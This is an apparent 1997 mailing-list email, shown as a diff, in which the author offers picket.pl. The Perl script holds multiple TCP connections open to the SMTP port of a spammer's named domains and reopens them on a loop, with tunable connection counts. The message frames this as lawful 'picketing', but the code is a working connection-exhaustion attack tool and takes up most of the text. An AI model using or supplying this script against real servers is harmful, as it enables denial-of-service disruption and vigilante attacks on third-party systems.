@@ -1,0 +1,123 @@
+From: Adam Back <aba@dcs.ex.ac.uk>
+Date: Sun, 17 Aug 1997 21:33:58 +0800
+To: enoch@zipcon.net
+Subject: picket.pl (was Re: Picketing With Packets)
+In-Reply-To: <19970816212754.10722.qmail@zipcon.net>
+Message-ID: <199708171319.OAA03207@server.test.net>
+MIME-Version: 1.0
+Content-Type: text/plain
+
+
+
+
+Mike Duvos <enoch@zipcon.net> writes:
+> We write a little Perl script that keeps exactly ONE AND ONLY ONE
+> TCP connection open to each of Mr. Spamford's machines.  Keeping a
+> single TCP connection open to someone's box is unlikely to be
+> illegal, and does not constitute a Denial of Service attack.
+> Consider it the packet equivalent of a single person picketing.
+
+Sounds good to me :-)
+
+Here's picket.pl.
+
+You create two files, one called "hosts" the other called "services",
+a hosts file of all of Spamford machines (if you have a list):
+
+answerme.com
+spamford.com
+savetrees.com
+
+and a "services" file with:
+
+smtp
+
+should do what you describe.
+
+There are a number of arguments you can play with also:
+
+% picket.pl [<num> [<max> [<sleep>] ] ]
+
+<num> is the number of sockets to hold open on each machine/service.
+Eg if we set this to 10, it'll try to open 10 connections to the SMTP
+port at savetrees.com.  (Defaults to 1)
+
+<max> is the maximum number of connections to hold open (you might want
+some left for your own use :-).  Linux seemed to merrily go over 256
+though I think some unixes will give you a per user limit of around
+256.  (Defaults to 100).
+
+<sleep> is how long to wait before closing and reopening all the
+descriptors.  (Defaults to 1 minute).
+
+For example:
+
+% picket.pl 10 100 600
+
+would open 10 connections on each port, would consume 100 socket
+descriptors locally, and would wait 10 mins before closing them and
+starting over.
+
+Adam
+
+==============================8<==============================
+#!/usr/local/bin/perl -s
+
+($num, $max, $sleep) = @ARGV;
+if (!defined($num)) { $num = 1; }	# try to open 1 socket on each service
+if (!defined($max)) { $max = 100; }	# use this many file descriptors
+if (!defined($sleep)) { $sleep = 60; }	# repeat after this time in seconds
+
+use Socket;
+$proto = getprotobyname( "tcp" );
+$count = 0;
+
+$/ = undef;
+open( SERVICES, "services" ) || die( "can't open services\n" );
+chop( @service = <SERVICES> );
+close( SERVICES );
+
+open( HOSTS, "hosts" ) || die( "can't open hosts\n" );
+chop( @hosts = <HOSTS> );
+close( HOSTS );
+
+while ( 1 )
+{
+    foreach $host ( @hosts )
+    {
+	foreach $service ( @service )
+	{
+	    foreach ( 1..$num )
+	    {
+		stuff( $host, $service );
+		if ( $v )
+		{
+		    print "fd[$count] = connect( $host:\U$service )\n";
+		}
+	    }
+	}
+    }
+    sleep( $sleep );
+}
+
+sub stuff
+{
+    my( $host, $service ) = @_; 
+    my( $sock, $port, $ipaddr, $addr );
+    $sock = "SOCK$count";
+    $count = ($count + 1) % $max;
+    close( $sock );
+    
+    $port = getservbyname( $service, "tcp" );
+    socket( $sock, PF_INET, SOCK_STREAM, $proto );
+
+    $ipaddr = inet_aton( $host );
+    $addr = sockaddr_in( $port, $ipaddr );
+    connect( $sock, $addr );
+}
+#==============================8<==============================
+
+
+
+
+
